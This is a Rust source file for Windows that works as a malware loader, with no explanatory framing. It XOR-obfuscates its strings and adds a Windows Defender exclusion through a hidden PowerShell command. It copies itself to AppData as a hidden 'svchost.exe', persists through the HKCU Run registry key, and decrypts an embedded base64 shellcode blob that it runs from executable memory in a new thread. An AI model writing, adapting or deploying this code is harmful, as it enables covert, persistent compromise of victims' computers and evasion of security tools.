#![cfg_attr(windows, windows_subsystem = "windows")]
use std::ffi::CString;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::ptr;
use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use std::os::windows::process::CommandExt;
use rand::Rng;

const ENCRYPTED_SHELLCODE: &str = "qb3aVVVVNWSH3LAx3gdl3gdZ3gdB3id9WuIfc2SqZJX5aTQpV3l1lJpYVJIcILoHAt4HRd4XaVSF3hUt0JUhGVSF3g11Bd4dTVSG0JwhaRxkqt5h3lSDZJWUmlj5VJJttSChViitbihxILUN3g1xVIYz3lke3g1JVIbeUd5UhdwRcXEODjQMDwSqtQ0KD95HvNWqqqoIPWZnVVU9IiZnCgE9GSJzUty9qoXtxVRVVXyRAQU9fNU+VaqAP189lf1UMT1XVUQJ3LMFBQUFFQUVBT2/Woq1qoDCP0UDAj3M8CE0qoDQlSFfqhtdILm9MlVVVT9VP1EDAj1XjJ0KqoDWrVUrY95jPxU9VUVVVQM/VT0N8QawqoDGBj9VAwYCPVeMnQqqgNatVSh9DT1VFVVVP1UFPV56WmWqgAI9IDsYNKqACwuqWXFa0CWqqqq8zqqqqlSWfJMglJbupeD3Az9VBqqA";
const KEY: u8 = 0x55;

fn encrypt_string(s: &str, key: u8) -> Vec<u8> {
    s.bytes().map(|b| b ^ key).collect()
}

fn decrypt_string(data: &[u8], key: u8) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ key).collect()).unwrap()
}

fn decrypt_shellcode(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|&b| b ^ key).collect()
}

#[cfg(target_os = "windows")]
fn add_defender_exclusion(path: &str) -> io::Result<()> {
    use std::process::Command;
    let exclusion_cmd = format!("Add-MpPreference -ExclusionPath '{}'", path);
    Command::new("powershell")
        .arg("-Command")
        .arg(&exclusion_cmd)
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()?;
    Ok(())
}

fn random_string(len: usize) -> String {
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        .chars()
        .collect();
    let mut rng = rand::thread_rng();
    (0..len)
        .map(|_| chars[rng.gen_range(0..chars.len())])
        .collect()
}

fn main() -> io::Result<()> {
    let x1 = encrypt_string("APPDATA", KEY);
    let x2 = encrypt_string("Microsoft\\Windows\\System", KEY);
    let x3 = encrypt_string("svchost.exe", KEY);
    let x4 = encrypt_string("Software\\Microsoft\\Windows\\CurrentVersion\\Run", KEY);
    let x5 = encrypt_string("SystemService", KEY);

    let appdata = std::env::var(decrypt_string(&x1, KEY))
        .map(|appdata| format!("{}\\{}", appdata, decrypt_string(&x2, KEY)))
        .unwrap_or("C:\\Users\\Public".to_string());
    let target_path = format!("{}\\{}", appdata, decrypt_string(&x3, KEY));

    let current_exe = std::env::current_exe()?.to_str().unwrap().to_string();

    #[cfg(target_os = "windows")]
    add_defender_exclusion(&appdata)?;

    if current_exe != target_path {
        fs::create_dir_all(&appdata)?;
        let mut src_file = File::open(&current_exe)?;
        let mut dst_file = File::create(&target_path)?;
        let mut buffer = Vec::new();
        src_file.read_to_end(&mut buffer)?;
        dst_file.write_all(&buffer)?;
        dst_file.flush()?;

        #[cfg(target_os = "windows")]
        {
            use std::process::Command;
            Command::new("attrib")
                .arg("+h")
                .arg(&target_path)
                .creation_flags(0x08000000)
                .output()?;
        }

        let reg_path = CString::new(decrypt_string(&x4, KEY))?;
        let value_name = CString::new(decrypt_string(&x5, KEY))?;
        let value_data = CString::new(target_path.clone())?;
        let mut hkey = ptr::null_mut();
        unsafe {
            RegCreateKeyExA(
                HKEY_CURRENT_USER,
                reg_path.as_ptr(),
                0,
                ptr::null_mut(),
                0,
                0xf003f,
                ptr::null_mut(),
                &mut hkey,
                ptr::null_mut(),
            );
            RegSetValueExA(
                hkey,
                value_name.as_ptr(),
                0,
                1,
                value_data.as_ptr() as *const u8,
                value_data.as_bytes_with_nul().len() as u32,
            );
        }
    }

    let decoded = STANDARD
        .decode(ENCRYPTED_SHELLCODE)
        .expect("Failed to decode Base64 shellcode");
    let shellcode = decrypt_shellcode(&decoded, KEY);

    let mem = unsafe { VirtualAlloc(ptr::null_mut(), shellcode.len(), MEM_COMMIT, PAGE_READWRITE) };
    if mem.is_null() {
        panic!("Failed to allocate memory");
    }

    unsafe {
        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
    }

    let mut old_protect = 0;
    unsafe {
        VirtualProtect(mem, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
    }

    unsafe {
        CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(mem)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
    }

    loop {
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
    Ok(())
}